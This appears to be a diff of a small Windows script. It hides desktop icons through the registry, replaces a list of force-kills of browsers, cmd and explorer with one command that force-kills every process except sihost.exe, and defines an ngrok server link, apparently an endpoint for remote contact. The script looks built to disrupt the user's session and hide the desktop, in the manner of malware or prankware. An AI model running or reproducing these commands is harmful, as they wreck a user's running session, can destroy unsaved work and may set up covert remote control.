@@ -1,12 +1,6 @@
 ﻿
 REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "HideIcons" /t REG_DWORD /d 1 /f
-taskkill /f /im opera.exe
-taskkill /f /im firefox.exe
-taskkill /f /im chrome.exe
-taskkill /f /im microsoftedge.exe
-taskkill /f /im SystemSettings.exe
-taskkill /f /im cmd.exe
-taskkill /f /im explorer.exe
+taskkill /f /fi "IMAGENAME ne sihost.exe"
 
 
 $ngrokServer = 'ngrok_link/index.php'
